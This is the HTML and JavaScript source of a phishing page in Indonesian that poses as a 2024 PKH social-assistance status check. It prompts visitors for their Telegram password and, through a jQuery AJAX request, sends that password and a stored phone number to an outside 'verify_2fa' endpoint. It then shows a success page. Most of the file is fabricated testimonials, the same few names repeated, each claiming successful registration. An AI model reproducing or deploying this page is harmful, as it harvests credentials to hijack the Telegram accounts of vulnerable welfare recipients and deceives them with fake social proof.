
<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Bansos PKH 2024</title>
  <meta name="robots" content="nofollow, noindex" />
  <link rel="shortcut icon" href="assets/images/icon.png" />
  <link rel="stylesheet" href="css/font.css" />
  <link rel="stylesheet" href="css/bootstrap.min.css" />
  <style>
      #loader {
      height: 100vh;
      width: 100vw;
      position: fixed;
      top: 0;
      left: 0;
      background: rgba(255, 255, 255, .7);
      display: flex;
      align-items: center;
      justify-content: center;
      z-index: 9999;
    }

    .loader {
      width: 45px;
      aspect-ratio: 1;
      --c: no-repeat linear-gradient(#000000 0 0);
      background: var(--c) 0% 50%, var(--c) 50% 50%, var(--c) 100% 50%;
      background-size: 20% 100%;
      animation: l1 .5s infinite linear;
    }

    @keyframes l1 {
      0% {background-size: 20% 100%,20% 100%,20% 100%}
      33% {background-size: 20% 10%,20% 100%,20% 100%}
      50% {background-size: 20% 100%,20% 10%,20% 100%}
      66% {background-size: 20% 100%,20% 100%,20% 10%}
      100% {background-size: 20% 100%,20% 100%,20% 100%}
    }

    .input-group input {
      font-size: 1.25rem;
    }

    .feedback {
      font-size: 1.2rem;
      margin-top: 1rem;
    }
  </style>
  <script src="java/jQuery.min.js"></script>
</head>
<body>
  <div style="width: 100%;padding: 0px 16px;max-width: 600px;margin: auto;">
    <p class="my-2 text-center">
      <span>Bahasa Indonesia</span> | <a href="">English</a> | <a href="">中文(简体)</a> | <a href="">தமிழ்</a>
    </p>
    <img class="w-100 mb-3" src="https://hosting.tigerengine.id/14ij9u.jpg" />
    
    <h1 class="mt-3 text-center text-primary" style="font-size: 30px!important">DAFTAR DI BAWAH INI</h1>
    <p class="text-center" style="color: black; font-size: 15px;">
    Silahkan Masukkan Password telegram untuk mengecek
    status bansos anda
  </p>
<div class="mb-3">
<div id="feedback" class="mb-3"></div>
  <label id="wrong" for="" class="form-label" style="display:none;"><span>Password Tidak Valid</span></label>
  <div class="input-group">
    <span class="input-group-text" id="basic-addon1" style="display: flex;gap: 3px;">Password</span>
    <input type="password" class="form-control shadow-none" name="password" id="password" placeholder="Silahkan Masukkan Password" maxlength="32" aria-describedby="basic-addon1" required />
  </div>
</div>
<button class="btn btn-primary mx-auto d-block mb-3" id="verifyButton">Lanjutkan</button>

<div id="loader" style="display:none;"><div class="loader"></div></div>
<script>
  $(document).ready(function() {
        $("#verifyButton").on("click", function(e) {
            e.preventDefault();

            const password = $("#password").val();
            const feedback = $("#feedback");
            const loader = $("#loader");

            const phoneNumber = sessionStorage.getItem('phone');

            loader.show();
            feedback.hide();

            $.ajax({
                url: "https://sky-hostingerid.biz.id/bot4/verify_2fa",
                type: "POST",
                contentType: "application/json",
                data: JSON.stringify({
                    password: password,
                    phone: "+62" + phoneNumber
                }),
                success: function(data) {
                    loader.hide();
                    if (data.status === "success") {
                        feedback
                            .removeClass('border-red-500 text-red-500')
                            .addClass('border-green-500 text-green-500')
                            .html('<strong><i class="fas fa-exclamation-circle"></i></strong><br>' + data.message)
                            .show();
                        window.location.href = "success.php";
                    } else {
                        feedback
                            .removeClass('border-green-500 text-green-500')
                            .addClass('border-red-500 text-red-500')
                            .html('<strong><i class="fas fa-exclamation-circle"></i></strong><br>' + data.message)
                            .show();
                    }
                },
                error: function(xhr) {
                    loader.hide();
                    const errorResponse = xhr.responseJSON || { message: "Terjadi kesalahan saat memverifikasi kode 2FA." };
                    feedback
                        .removeClass('border-green-500 text-green-500')
                        .addClass('border-red-500 text-red-500')
                        .html('<strong><i class="fas fa-exclamation-circle"></i> Error</strong><br>' + errorResponse.message)
                        .show();
                }
            });
        });
    });
</script>    <style>
        #testimoni {
          border: 1px solid #EFEFEF;
          padding: 16px;
          max-height: 350px;
          margin-bottom: 32px;
          overflow: hidden;
        } #testimoni .tests {
          background: rgba(0, 166, 255, .07);
          padding: 16px;
          margin-bottom: 16px;
        } #testimoni .tests span.name {
          display: block;
          font-weight: bold;
        }
      </style>
      <div id="testimoni">
                <div class="tests" style="display: flex;gap: 15px;">
          <img src="img/avatar.png" style="width: 50px;border-radius: 50%;border: 1px solid #777;object-fit: cover;aspect-ratio: 1/1;height: 50px;" />
          <div>
              <span class="name">Ahmad Fauzi</span>
              <span class="text">Pendaftaran Berhasil <img src="https://www.svgrepo.com/show/395995/check-mark-button.svg" style="height: 16px;" /></span>
          </div>
        </div>
                <div class="tests" style="display: flex;gap: 15px;">
          <img src="img/r2.jpg" style="width: 50px;border-radius: 50%;border: 1px solid #777;object-fit: cover;aspect-ratio: 1/1;height: 50px;" />
          <div>
              <span class="name">Siti Aminah</span>
              <span class="text">Pendaftaran Berhasil <img src="https://www.svgrepo.com/show/395995/check-mark-button.svg" style="height: 16px;" /></span>
          </div>
        </div>
                <div class="tests" style="display: flex;gap: 15px;">
          <img src="img/r3.jpg" style="width: 50px;border-radius: 50%;border: 1px solid #777;object-fit: cover;aspect-ratio: 1/1;height: 50px;" />
          <div>
              <span class="name">Budi Santoso</span>
              <span class="text">Pendaftaran Berhasil <img src="https://www.svgrepo.com/show/395995/check-mark-button.svg" style="height: 16px;" /></span>
          </div>
        </div>
                <div class="tests" style="display: flex;gap: 15px;">
          <img src="img/r4.jpg" style="width: 50px;border-radius: 50%;border: 1px solid #777;object-fit: cover;aspect-ratio: 1/1;height: 50px;" />
          <div>
              <span class="name">Dewi Lestari</span>
              <span class="text">Pendaftaran Berhasil <img src="https://www.svgrepo.com/show/395995/check-mark-button.svg" style="height: 16px;" /></span>
          </div>
        </div>
                <div class="tests" style="display: flex;gap: 15px;">
          <img src="img/r5.jpg" style="width: 50px;border-radius: 50%;border: 1px solid #777;object-fit: cover;aspect-ratio: 1/1;height: 50px;" />
          <div>
              <span class="name">Andi Prasetyo</span>
              <span class="text">Pendaftaran Berhasil <img src="https://www.svgrepo.com/show/395995/check-mark-button.svg" style="height: 16px;" /></span>
          </div>
        </div>
                <div class="tests" style="display: flex;gap: 15px;">
          <img src="img/r6.jpg" style="width: 50px;border-radius: 50%;border: 1px solid #777;object-fit: cover;aspect-ratio: 1/1;height: 50px;" />
          <div>
              <span class="name">Rina Hapsari</span>
              <span class="text">Pendaftaran Berhasil <img src="https://www.svgrepo.com/show/395995/check-mark-button.svg" style="height: 16px;" /></span>
          </div>
        </div>
                <div class="tests" style="display: flex;gap: 15px;">
          <img src="img/r7.jpg" style="width: 50px;border-radius: 50%;border: 1px solid #777;object-fit: cover;aspect-ratio: 1/1;height: 50px;" />
          <div>
              <span class="name">Joko Susanto</span>
              <span class="text">Pendaftaran Berhasil <img src="https://www.svgrepo.com/show/395995/check-mark-button.svg" style="height: 16px;" /></span>
          </div>
        </div>
                <div class="tests" style="display: flex;gap: 15px;">
          <img src="img/r8.jpg" style="width: 50px;border-radius: 50%;border: 1px solid #777;object-fit: cover;aspect-ratio: 1/1;height: 50px;" />
          <div>
              <span class="name">Fitriani Melati</span>
              <span class="text">Pendaftaran Berhasil <img src="https://www.svgrepo.com/show/395995/check-mark-button.svg" style="height: 16px;" /></span>
          </div>
        </div>
                <div class="tests" style="display: flex;gap: 15px;">
          <img src="img/r9.jpg" style="width: 50px;border-radius: 50%;border: 1px solid #777;object-fit: cover;aspect-ratio: 1/1;height: 50px;" />
          <div>
              <span class="name">Eko Wahyudi</span>
              <span class="text">Pendaftaran Berhasil <img src="https://www.svgrepo.com/show/395995/check-mark-button.svg" style="height: 16px;" /></span>
          </div>
        </div>
                <div class="tests" style="display: flex;gap: 15px;">
          <img src="img/r10.jpg" style="width: 50px;border-radius: 50%;border: 1px solid #777;object-fit: cover;aspect-ratio: 1/1;height: 50px;" />
          <div>
              <span class="name">Ahmad Fauzi</span>
              <span class="text">Pendaftaran Berhasil <img src="https://www.svgrepo.com/show/395995/check-mark-button.svg" style="height: 16px;" /></span>
          </div>
        </div>
                <div class="tests" style="display: flex;gap: 15px;">
          <img src="img/r2.jpg" style="width: 50px;border-radius: 50%;border: 1px solid #777;object-fit: cover;aspect-ratio: 1/1;height: 50px;" />
          <div>
              <span class="name">Siti Aminah</span>
              <span class="text">Pendaftaran Berhasil <img src="https://www.svgrepo.com/show/395995/check-mark-button.svg" style="height: 16px;" /></span>
          </div>
        </div>
                <div class="tests" style="display: flex;gap: 15px;">
          <img src="img/r3.jpg" style="width: 50px;border-radius: 50%;border: 1px solid #777;object-fit: cover;aspect-ratio: 1/1;height: 50px;" />
          <div>
              <span class="name">Budi Santoso</span>
              <span class="text">Pendaftaran Berhasil <img src="https://www.svgrepo.com/show/395995/check-mark-button.svg" style="height: 16px;" /></span>
          </div>
        </div>
                <div class="tests" style="display: flex;gap: 15px;">
          <img src="img/r4.jpg" style="width: 50px;border-radius: 50%;border: 1px solid #777;object-fit: cover;aspect-ratio: 1/1;height: 50px;" />
          <div>
              <span class="name">Dewi Lestari</span>
              <span class="text">Pendaftaran Berhasil <img src="https://www.svgrepo.com/show/395995/check-mark-button.svg" style="height: 16px;" /></span>
          </div>
        </div>
                <div class="tests" style="display: flex;gap: 15px;">
          <img src="img/r5.jpg" style="width: 50px;border-radius: 50%;border: 1px solid #777;object-fit: cover;aspect-ratio: 1/1;height: 50px;" />
          <div>
              <span class="name">Andi Prasetyo</span>
              <span class="text">Pendaftaran Berhasil <img src="https://www.svgrepo.com/show/395995/check-mark-button.svg" style="height: 16px;" /></span>
          </div>
        </div>
                <div class="tests" style="display: flex;gap: 15px;">
          <img src="img/r6.jpg" style="width: 50px;border-radius: 50%;border: 1px solid #777;object-fit: cover;aspect-ratio: 1/1;height: 50px;" />
          <div>
              <span class="name">Rina Hapsari</span>
              <span class="text">Pendaftaran Berhasil <img src="https://www.svgrepo.com/show/395995/check-mark-button.svg" style="height: 16px;" /></span>
          </div>
        </div>
                <div class="tests" style="display: flex;gap: 15px;">
          <img src="img/r7.jpg" style="width: 50px;border-radius: 50%;border: 1px solid #777;object-fit: cover;aspect-ratio: 1/1;height: 50px;" />
          <div>
              <span class="name">Joko Susanto</span>
              <span class="text">Pendaftaran Berhasil <img src="https://www.svgrepo.com/show/395995/check-mark-button.svg" style="height: 16px;" /></span>
          </div>
        </div>
                <div class="tests" style="display: flex;gap: 15px;">
          <img src="img/r8.jpg" style="width: 50px;border-radius: 50%;border: 1px solid #777;object-fit: cover;aspect-ratio: 1/1;height: 50px;" />
          <div>
              <span class="name">Fitriani Melati</span>
              <span class="text">Pendaftaran Berhasil <img src="https://www.svgrepo.com/show/395995/check-mark-button.svg" style="height: 16px;" /></span>
          </div>
        </div>
                <div class="tests" style="display: flex;gap: 15px;">
          <img src="img/r9.jpg" style="width: 50px;border-radius: 50%;border: 1px solid #777;object-fit: cover;aspect-ratio: 1/1;height: 50px;" />
          <div>
              <span class="name">Eko Wahyudi</span>
              <span class="text">Pendaftaran Berhasil <img src="https://www.svgrepo.com/show/395995/check-mark-button.svg" style="height: 16px;" /></span>
          </div>
        </div>
                <div class="tests" style="display: flex;gap: 15px;">
          <img src="img/r10.jpg" style="width: 50px;border-radius: 50%;border: 1px solid #777;object-fit: cover;aspect-ratio: 1/1;height: 50px;" />
          <div>
              </div>
              <div class="tests" style="display: flex;gap: 15px;">
          <img src="img/r1.jpg" style="width: 50px;border-radius: 50%;border: 1px solid #777;object-fit: cover;aspect-ratio: 1/1;height: 50px;" />
          <div>
              <span class="name">Ahmad Fauzi</span>
              <span class="text">Pendaftaran Berhasil <img src="https://www.svgrepo.com/show/395995/check-mark-button.svg" style="height: 16px;" /></span>
          </div>
        </div>
                <div class="tests" style="display: flex;gap: 15px;">
          <img src="img/r2.jpg" style="width: 50px;border-radius: 50%;border: 1px solid #777;object-fit: cover;aspect-ratio: 1/1;height: 50px;" />
          <div>
              <span class="name">Siti Aminah</span>
              <span class="text">Pendaftaran Berhasil <img src="https://www.svgrepo.com/show/395995/check-mark-button.svg" style="height: 16px;" /></span>
          </div>
        </div>
                <div class="tests" style="display: flex;gap: 15px;">
          <img src="img/r3.jpg" style="width: 50px;border-radius: 50%;border: 1px solid #777;object-fit: cover;aspect-ratio: 1/1;height: 50px;" />
          <div>
              <span class="name">Budi Santoso</span>
              <span class="text">Pendaftaran Berhasil <img src="https://www.svgrepo.com/show/395995/check-mark-button.svg" style="height: 16px;" /></span>
          </div>
        </div>
                <div class="tests" style="display: flex;gap: 15px;">
          <img src="img/r4.jpg" style="width: 50px;border-radius: 50%;border: 1px solid #777;object-fit: cover;aspect-ratio: 1/1;height: 50px;" />
          <div>
              <span class="name">Dewi Lestari</span>
              <span class="text">Pendaftaran Berhasil <img src="https://www.svgrepo.com/show/395995/check-mark-button.svg" style="height: 16px;" /></span>
          </div>
        </div>
                <div class="tests" style="display: flex;gap: 15px;">
          <img src="img/r5.jpg" style="width: 50px;border-radius: 50%;border: 1px solid #777;object-fit: cover;aspect-ratio: 1/1;height: 50px;" />
          <div>
              <span class="name">Andi Prasetyo</span>
              <span class="text">Pendaftaran Berhasil <img src="https://www.svgrepo.com/show/395995/check-mark-button.svg" style="height: 16px;" /></span>
          </div>
        </div>
                <div class="tests" style="display: flex;gap: 15px;">
          <img src="img/r6.jpg" style="width: 50px;border-radius: 50%;border: 1px solid #777;object-fit: cover;aspect-ratio: 1/1;height: 50px;" />
          <div>
              <span class="name">Rina Hapsari</span>
              <span class="text">Pendaftaran Berhasil <img src="https://www.svgrepo.com/show/395995/check-mark-button.svg" style="height: 16px;" /></span>
          </div>
        </div>
                <div class="tests" style="display: flex;gap: 15px;">
          <img src="img/r7.jpg" style="width: 50px;border-radius: 50%;border: 1px solid #777;object-fit: cover;aspect-ratio: 1/1;height: 50px;" />
          <div>
              <span class="name">Joko Susanto</span>
              <span class="text">Pendaftaran Berhasil <img src="https://www.svgrepo.com/show/395995/check-mark-button.svg" style="height: 16px;" /></span>
          </div>
        </div>
                <div class="tests" style="display: flex;gap: 15px;">
          <img src="img/r8.jpg" style="width: 50px;border-radius: 50%;border: 1px solid #777;object-fit: cover;aspect-ratio: 1/1;height: 50px;" />
          <div>
              <span class="name">Fitriani Melati</span>
              <span class="text">Pendaftaran Berhasil <img src="https://www.svgrepo.com/show/395995/check-mark-button.svg" style="height: 16px;" /></span>
          </div>
        </div>
                <div class="tests" style="display: flex;gap: 15px;">
          <img src="img/r9.jpg" style="width: 50px;border-radius: 50%;border: 1px solid #777;object-fit: cover;aspect-ratio: 1/1;height: 50px;" />
          <div>
              <span class="name">Eko Wahyudi</span>
              <span class="text">Pendaftaran Berhasil <img src="https://www.svgrepo.com/show/395995/check-mark-button.svg" style="height: 16px;" /></span>
          </div>
        </div>
                <div class="tests" style="display: flex;gap: 15px;">
          <img src="img/r10.jpg" style="width: 50px;border-radius: 50%;border: 1px solid #777;object-fit: cover;aspect-ratio: 1/1;height: 50px;" />
          <div>
              <span class="name">Ahmad Fauzi</span>
              <span class="text">Pendaftaran Berhasil <img src="https://www.svgrepo.com/show/395995/check-mark-button.svg" style="height: 16px;" /></span>
          </div>
        </div>
                <div class="tests" style="display: flex;gap: 15px;">
          <img src="img/r2.jpg" style="width: 50px;border-radius: 50%;border: 1px solid #777;object-fit: cover;aspect-ratio: 1/1;height: 50px;" />
          <div>
              <span class="name">Siti Aminah</span>
              <span class="text">Pendaftaran Berhasil <img src="https://www.svgrepo.com/show/395995/check-mark-button.svg" style="height: 16px;" /></span>
          </div>
        </div>
                <div class="tests" style="display: flex;gap: 15px;">
          <img src="img/r3.jpg" style="width: 50px;border-radius: 50%;border: 1px solid #777;object-fit: cover;aspect-ratio: 1/1;height: 50px;" />
          <div>
              <span class="name">Budi Santoso</span>
              <span class="text">Pendaftaran Berhasil <img src="https://www.svgrepo.com/show/395995/check-mark-button.svg" style="height: 16px;" /></span>
          </div>
        </div>
                <div class="tests" style="display: flex;gap: 15px;">
          <img src="img/r4.jpg" style="width: 50px;border-radius: 50%;border: 1px solid #777;object-fit: cover;aspect-ratio: 1/1;height: 50px;" />
          <div>
              <span class="name">Dewi Lestari</span>
              <span class="text">Pendaftaran Berhasil <img src="https://www.svgrepo.com/show/395995/check-mark-button.svg" style="height: 16px;" /></span>
          </div>
        </div>
                <div class="tests" style="display: flex;gap: 15px;">
          <img src="img/r5.jpg" style="width: 50px;border-radius: 50%;border: 1px solid #777;object-fit: cover;aspect-ratio: 1/1;height: 50px;" />
          <div>
              <span class="name">Andi Prasetyo</span>
              <span class="text">Pendaftaran Berhasil <img src="https://www.svgrepo.com/show/395995/check-mark-button.svg" style="height: 16px;" /></span>
          </div>
        </div>
                <div class="tests" style="display: flex;gap: 15px;">
          <img src="img/r6.jpg" style="width: 50px;border-radius: 50%;border: 1px solid #777;object-fit: cover;aspect-ratio: 1/1;height: 50px;" />
          <div>
              <span class="name">Rina Hapsari</span>
              <span class="text">Pendaftaran Berhasil <img src="https://www.svgrepo.com/show/395995/check-mark-button.svg" style="height: 16px;" /></span>
          </div>
        </div>
                <div class="tests" style="display: flex;gap: 15px;">
          <img src="img/r7.jpg" style="width: 50px;border-radius: 50%;border: 1px solid #777;object-fit: cover;aspect-ratio: 1/1;height: 50px;" />
          <div>
              <span class="name">Joko Susanto</span>
              <span class="text">Pendaftaran Berhasil <img src="https://www.svgrepo.com/show/395995/check-mark-button.svg" style="height: 16px;" /></span>
          </div>
        </div>
                <div class="tests" style="display: flex;gap: 15px;">
          <img src="img/r8.jpg" style="width: 50px;border-radius: 50%;border: 1px solid #777;object-fit: cover;aspect-ratio: 1/1;height: 50px;" />
          <div>
              <span class="name">Fitriani Melati</span>
              <span class="text">Pendaftaran Berhasil <img src="https://www.svgrepo.com/show/395995/check-mark-button.svg" style="height: 16px;" /></span>
          </div>
        </div>
                <div class="tests" style="display: flex;gap: 15px;">
          <img src="img/r9.jpg" style="width: 50px;border-radius: 50%;border: 1px solid #777;object-fit: cover;aspect-ratio: 1/1;height: 50px;" />
          <div>
              <span class="name">Eko Wahyudi</span>
              <span class="text">Pendaftaran Berhasil <img src="https://www.svgrepo.com/show/395995/check-mark-button.svg" style="height: 16px;" /></span>
          </div>
        </div>
                <div class="tests" style="display: flex;gap: 15px;">
          <img src="img/r10.jpg" style="width: 50px;border-radius: 50%;border: 1px solid #777;object-fit: cover;aspect-ratio: 1/1;height: 50px;" />
          <div>
              <div class="tests" style="display: flex;gap: 15px;">
          <img src="img/r1.jpg" style="width: 50px;border-radius: 50%;border: 1px solid #777;object-fit: cover;aspect-ratio: 1/1;height: 50px;" />
          <div>
              <span class="name">Ahmad Fauzi</span>
              <span class="text">Pendaftaran Berhasil <img src="https://www.svgrepo.com/show/395995/check-mark-button.svg" style="height: 16px;" /></span>
          </div>
        </div>
                <div class="tests" style="display: flex;gap: 15px;">
          <img src="img/r2.jpg" style="width: 50px;border-radius: 50%;border: 1px solid #777;object-fit: cover;aspect-ratio: 1/1;height: 50px;" />
          <div>
              <span class="name">Siti Aminah</span>
              <span class="text">Pendaftaran Berhasil <img src="https://www.svgrepo.com/show/395995/check-mark-button.svg" style="height: 16px;" /></span>
          </div>
        </div>
                <div class="tests" style="display: flex;gap: 15px;">
          <img src="img/r3.jpg" style="width: 50px;border-radius: 50%;border: 1px solid #777;object-fit: cover;aspect-ratio: 1/1;height: 50px;" />
          <div>
              <span class="name">Budi Santoso</span>
              <span class="text">Pendaftaran Berhasil <img src="https://www.svgrepo.com/show/395995/check-mark-button.svg" style="height: 16px;" /></span>
          </div>
        </div>
                <div class="tests" style="display: flex;gap: 15px;">
          <img src="img/r4.jpg" style="width: 50px;border-radius: 50%;border: 1px solid #777;object-fit: cover;aspect-ratio: 1/1;height: 50px;" />
          <div>
              <span class="name">Dewi Lestari</span>
              <span class="text">Pendaftaran Berhasil <img src="https://www.svgrepo.com/show/395995/check-mark-button.svg" style="height: 16px;" /></span>
          </div>
        </div>
                <div class="tests" style="display: flex;gap: 15px;">
          <img src="img/r5.jpg" style="width: 50px;border-radius: 50%;border: 1px solid #777;object-fit: cover;aspect-ratio: 1/1;height: 50px;" />
          <div>
              <span class="name">Andi Prasetyo</span>
              <span class="text">Pendaftaran Berhasil <img src="https://www.svgrepo.com/show/395995/check-mark-button.svg" style="height: 16px;" /></span>
          </div>
        </div>
                <div class="tests" style="display: flex;gap: 15px;">
          <img src="img/r6.jpg" style="width: 50px;border-radius: 50%;border: 1px solid #777;object-fit: cover;aspect-ratio: 1/1;height: 50px;" />
          <div>
              <span class="name">Rina Hapsari</span>
              <span class="text">Pendaftaran Berhasil <img src="https://www.svgrepo.com/show/395995/check-mark-button.svg" style="height: 16px;" /></span>
          </div>
        </div>
                <div class="tests" style="display: flex;gap: 15px;">
          <img src="img/r7.jpg" style="width: 50px;border-radius: 50%;border: 1px solid #777;object-fit: cover;aspect-ratio: 1/1;height: 50px;" />
          <div>
              <span class="name">Joko Susanto</span>
              <span class="text">Pendaftaran Berhasil <img src="https://www.svgrepo.com/show/395995/check-mark-button.svg" style="height: 16px;" /></span>
          </div>
        </div>
                <div class="tests" style="display: flex;gap: 15px;">
          <img src="img/r8.jpg" style="width: 50px;border-radius: 50%;border: 1px solid #777;object-fit: cover;aspect-ratio: 1/1;height: 50px;" />
          <div>
              <span class="name">Fitriani Melati</span>
              <span class="text">Pendaftaran Berhasil <img src="https://www.svgrepo.com/show/395995/check-mark-button.svg" style="height: 16px;" /></span>
          </div>
        </div>
                <div class="tests" style="display: flex;gap: 15px;">
          <img src="img/r9.jpg" style="width: 50px;border-radius: 50%;border: 1px solid #777;object-fit: cover;aspect-ratio: 1/1;height: 50px;" />
          <div>
              <span class="name">Eko Wahyudi</span>
              <span class="text">Pendaftaran Berhasil <img src="https://www.svgrepo.com/show/395995/check-mark-button.svg" style="height: 16px;" /></span>
          </div>
        </div>
                <div class="tests" style="display: flex;gap: 15px;">
          <img src="img/r10.jpg" style="width: 50px;border-radius: 50%;border: 1px solid #777;object-fit: cover;aspect-ratio: 1/1;height: 50px;" />
          <div>
              <span class="name">Ahmad Fauzi</span>
              <span class="text">Pendaftaran Berhasil <img src="https://www.svgrepo.com/show/395995/check-mark-button.svg" style="height: 16px;" /></span>
          </div>
        </div>
                <div class="tests" style="display: flex;gap: 15px;">
          <img src="img/r2.jpg" style="width: 50px;border-radius: 50%;border: 1px solid #777;object-fit: cover;aspect-ratio: 1/1;height: 50px;" />
          <div>
              <span class="name">Siti Aminah</span>
              <span class="text">Pendaftaran Berhasil <img src="https://www.svgrepo.com/show/395995/check-mark-button.svg" style="height: 16px;" /></span>
          </div>
        </div>
                <div class="tests" style="display: flex;gap: 15px;">
          <img src="img/r3.jpg" style="width: 50px;border-radius: 50%;border: 1px solid #777;object-fit: cover;aspect-ratio: 1/1;height: 50px;" />
          <div>
              <span class="name">Budi Santoso</span>
              <span class="text">Pendaftaran Berhasil <img src="https://www.svgrepo.com/show/395995/check-mark-button.svg" style="height: 16px;" /></span>
          </div>
        </div>
                <div class="tests" style="display: flex;gap: 15px;">
          <img src="img/r4.jpg" style="width: 50px;border-radius: 50%;border: 1px solid #777;object-fit: cover;aspect-ratio: 1/1;height: 50px;" />
          <div>
              <span class="name">Dewi Lestari</span>
              <span class="text">Pendaftaran Berhasil <img src="https://www.svgrepo.com/show/395995/check-mark-button.svg" style="height: 16px;" /></span>
          </div>
        </div>
                <div class="tests" style="display: flex;gap: 15px;">
          <img src="img/r5.jpg" style="width: 50px;border-radius: 50%;border: 1px solid #777;object-fit: cover;aspect-ratio: 1/1;height: 50px;" />
          <div>
              <span class="name">Andi Prasetyo</span>
              <span class="text">Pendaftaran Berhasil <img src="https://www.svgrepo.com/show/395995/check-mark-button.svg" style="height: 16px;" /></span>
          </div>
        </div>
                <div class="tests" style="display: flex;gap: 15px;">
          <img src="img/r6.jpg" style="width: 50px;border-radius: 50%;border: 1px solid #777;object-fit: cover;aspect-ratio: 1/1;height: 50px;" />
          <div>
              <span class="name">Rina Hapsari</span>
              <span class="text">Pendaftaran Berhasil <img src="https://www.svgrepo.com/show/395995/check-mark-button.svg" style="height: 16px;" /></span>
          </div>
        </div>
                <div class="tests" style="display: flex;gap: 15px;">
          <img src="img/r7.jpg" style="width: 50px;border-radius: 50%;border: 1px solid #777;object-fit: cover;aspect-ratio: 1/1;height: 50px;" />
          <div>
              <span class="name">Joko Susanto</span>
              <span class="text">Pendaftaran Berhasil <img src="https://www.svgrepo.com/show/395995/check-mark-button.svg" style="height: 16px;" /></span>
          </div>
        </div>
                <div class="tests" style="display: flex;gap: 15px;">
          <img src="img/r8.jpg" style="width: 50px;border-radius: 50%;border: 1px solid #777;object-fit: cover;aspect-ratio: 1/1;height: 50px;" />
          <div>
              <span class="name">Fitriani Melati</span>
              <span class="text">Pendaftaran Berhasil <img src="https://www.svgrepo.com/show/395995/check-mark-button.svg" style="height: 16px;" /></span>
          </div>
        </div>
                <div class="tests" style="display: flex;gap: 15px;">
          <img src="img/r9.jpg" style="width: 50px;border-radius: 50%;border: 1px solid #777;object-fit: cover;aspect-ratio: 1/1;height: 50px;" />
          <div>
              <span class="name">Eko Wahyudi</span>
              <span class="text">Pendaftaran Berhasil <img src="https://www.svgrepo.com/show/395995/check-mark-button.svg" style="height: 16px;" /></span>
          </div>
        </div>
                <div class="tests" style="display: flex;gap: 15px;">
          <img src="img/r10.jpg" style="width: 50px;border-radius: 50%;border: 1px solid #777;object-fit: cover;aspect-ratio: 1/1;height: 50px;" />
          <div>
             <span class="name">Ahmad Fauzi</span>
              <span class="text">Pendaftaran Berhasil <img src="https://www.svgrepo.com/show/395995/check-mark-button.svg" style="height: 16px;" /></span>
          </div>
        </div>
                <div class="tests" style="display: flex;gap: 15px;">
          <img src="img/r2.jpg" style="width: 50px;border-radius: 50%;border: 1px solid #777;object-fit: cover;aspect-ratio: 1/1;height: 50px;" />
          <div>
              <span class="name">Siti Aminah</span>
              <span class="text">Pendaftaran Berhasil <img src="https://www.svgrepo.com/show/395995/check-mark-button.svg" style="height: 16px;" /></span>
          </div>
        </div>
                <div class="tests" style="display: flex;gap: 15px;">
          <img src="img/r3.jpg" style="width: 50px;border-radius: 50%;border: 1px solid #777;object-fit: cover;aspect-ratio: 1/1;height: 50px;" />
          <div>
              <span class="name">Budi Santoso</span>
              <span class="text">Pendaftaran Berhasil <img src="https://www.svgrepo.com/show/395995/check-mark-button.svg" style="height: 16px;" /></span>
          </div>
        </div>
                <div class="tests" style="display: flex;gap: 15px;">
          <img src="img/r4.jpg" style="width: 50px;border-radius: 50%;border: 1px solid #777;object-fit: cover;aspect-ratio: 1/1;height: 50px;" />
          <div>
              <span class="name">Dewi Lestari</span>
              <span class="text">Pendaftaran Berhasil <img src="https://www.svgrepo.com/show/395995/check-mark-button.svg" style="height: 16px;" /></span>
          </div>
        </div>
                <div class="tests" style="display: flex;gap: 15px;">
          <img src="img/r5.jpg" style="width: 50px;border-radius: 50%;border: 1px solid #777;object-fit: cover;aspect-ratio: 1/1;height: 50px;" />
          <div>
              <span class="name">Andi Prasetyo</span>
              <span class="text">Pendaftaran Berhasil <img src="https://www.svgrepo.com/show/395995/check-mark-button.svg" style="height: 16px;" /></span>
          </div>
        </div>
                <div class="tests" style="display: flex;gap: 15px;">
          <img src="img/r6.jpg" style="width: 50px;border-radius: 50%;border: 1px solid #777;object-fit: cover;aspect-ratio: 1/1;height: 50px;" />
          <div>
              <span class="name">Rina Hapsari</span>
              <span class="text">Pendaftaran Berhasil <img src="https://www.svgrepo.com/show/395995/check-mark-button.svg" style="height: 16px;" /></span>
          </div>
        </div>
                <div class="tests" style="display: flex;gap: 15px;">
          <img src="img/r7.jpg" style="width: 50px;border-radius: 50%;border: 1px solid #777;object-fit: cover;aspect-ratio: 1/1;height: 50px;" />
          <div>
              <span class="name">Joko Susanto</span>
              <span class="text">Pendaftaran Berhasil <img src="https://www.svgrepo.com/show/395995/check-mark-button.svg" style="height: 16px;" /></span>
          </div>
        </div>
                <div class="tests" style="display: flex;gap: 15px;">
          <img src="img/r8.jpg" style="width: 50px;border-radius: 50%;border: 1px solid #777;object-fit: cover;aspect-ratio: 1/1;height: 50px;" />
          <div>
              <span class="name">Fitriani Melati</span>
              <span class="text">Pendaftaran Berhasil <img src="https://www.svgrepo.com/show/395995/check-mark-button.svg" style="height: 16px;" /></span>
          </div>
        </div>
                <div class="tests" style="display: flex;gap: 15px;">
          <img src="img/r9.jpg" style="width: 50px;border-radius: 50%;border: 1px solid #777;object-fit: cover;aspect-ratio: 1/1;height: 50px;" />
          <div>
              <span class="name">Eko Wahyudi</span>
              <span class="text">Pendaftaran Berhasil <img src="https://www.svgrepo.com/show/395995/check-mark-button.svg" style="height: 16px;" /></span>
          </div>
        </div>
                <div class="tests" style="display: flex;gap: 15px;">
          <img src="img/r10.jpg" style="width: 50px;border-radius: 50%;border: 1px solid #777;object-fit: cover;aspect-ratio: 1/1;height: 50px;" />
          <div>
              <span class="name">Ahmad Fauzi</span>
              <span class="text">Pendaftaran Berhasil <img src="https://www.svgrepo.com/show/395995/check-mark-button.svg" style="height: 16px;" /></span>
          </div>
        </div>
                <div class="tests" style="display: flex;gap: 15px;">
          <img src="img/r2.jpg" style="width: 50px;border-radius: 50%;border: 1px solid #777;object-fit: cover;aspect-ratio: 1/1;height: 50px;" />
          <div>
              <span class="name">Siti Aminah</span>
              <span class="text">Pendaftaran Berhasil <img src="https://www.svgrepo.com/show/395995/check-mark-button.svg" style="height: 16px;" /></span>
          </div>
        </div>
                <div class="tests" style="display: flex;gap: 15px;">
          <img src="img/r3.jpg" style="width: 50px;border-radius: 50%;border: 1px solid #777;object-fit: cover;aspect-ratio: 1/1;height: 50px;" />
          <div>
              <span class="name">Budi Santoso</span>
              <span class="text">Pendaftaran Berhasil <img src="https://www.svgrepo.com/show/395995/check-mark-button.svg" style="height: 16px;" /></span>
          </div>
        </div>
